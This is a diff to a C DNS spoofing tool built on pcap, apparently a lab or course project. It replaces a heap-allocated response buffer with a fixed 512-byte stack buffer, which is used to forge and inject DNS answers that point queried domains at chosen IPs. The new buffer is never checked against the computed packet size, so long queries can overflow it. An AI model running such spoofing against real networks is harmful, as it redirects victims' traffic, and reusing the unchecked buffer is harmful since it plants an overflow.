@@ -1,4 +1,4 @@
-#include "../include/dns_protocol.h"
+#include "dns_protocol.h"
 
 #include <arpa/inet.h>
 #include <net/ethernet.h>
@@ -162,7 +162,8 @@ uint16_t calculate_ip_checksum(const void *vdata, size_t length) {
 void send_dns_spoof_response(pcap_t *handle, const struct ether_header *ori_eth_hdr,
                              const struct ip *ori_ip_hdr, const struct udphdr *ori_udp_hdr,
                              const uint8_t *ori_dns_payload, int ori_qname_offset_in_dns_payload,
-                             int ori_qname_data_len_in_packet, const char *spoofed_ip_str) {
+                             int ori_qname_data_len_in_packet, const char *spoofed_ip_str,
+                             uint8_t *response_packet_buffer) {
   // Calculate fixed header sizes
   const int ETH_HDR_SIZE = sizeof(struct ether_header);
   const int IP_HDR_SIZE  = sizeof(struct ip);
@@ -185,11 +186,11 @@ void send_dns_spoof_response(pcap_t *handle, const struct ether_header *ori_eth_
   const int MAX_RESPONSE_PACKET_SIZE = ETH_HDR_SIZE + IP_HDR_SIZE + UDP_HDR_SIZE + DNS_HDR_SIZE +
                                        ori_question_section_size + DNS_ANSER_A_REC_SIZE;
 
-  uint8_t *response_packet = (uint8_t *)malloc(MAX_RESPONSE_PACKET_SIZE);
-  if (!response_packet) {
-    perror("Error: Failed to allocate memory for response packet");
-    return;
-  }
+  // uint8_t *response_packet = (uint8_t *)malloc(MAX_RESPONSE_PACKET_SIZE);
+  // The response_packet_buffer is already allocated on the stack in dns_packet_handler
+  // Stack allocation might improve time performance
+  uint8_t *response_packet = response_packet_buffer;
+
   memset(response_packet, 0, MAX_RESPONSE_PACKET_SIZE); // Zero out the buffer
 
   // Pointers to the headers within our response_packet buffer
@@ -447,6 +448,9 @@ void dns_packet_handler(u_char *user, const struct pcap_pkthdr *pkt_header,
                         const u_char *raw_packet) {
   pcap_t *handle = (pcap_t *)user;
 
+  // Stack-allocated buffer for the response packet
+  uint8_t response_packet_buffer[512];
+
   const struct ether_header *eth_hdr;
   const struct ip           *ip_hdr;
   const struct udphdr       *udp_hdr;
@@ -537,7 +541,7 @@ void dns_packet_handler(u_char *user, const struct pcap_pkthdr *pkt_header,
         // printf("TODO: Inject Response: %s --> %s\n", domain_map[i].domain, domain_map[i].ip);
         send_dns_spoof_response(handle, eth_hdr, ip_hdr, udp_hdr, dns_payload,
                                 initial_qname_offset_in_dns_payload, name_len_in_packet,
-                                domain_map[i].ip);
+                                domain_map[i].ip, response_packet_buffer);
         if (delete_me % 2 == 1)
           print_dns_packet_info(ip_hdr, udp_hdr, dns_payload, dns_length, pkt_header,
                                 queried_domain, qtype, qclass, domain_map[i].ip);
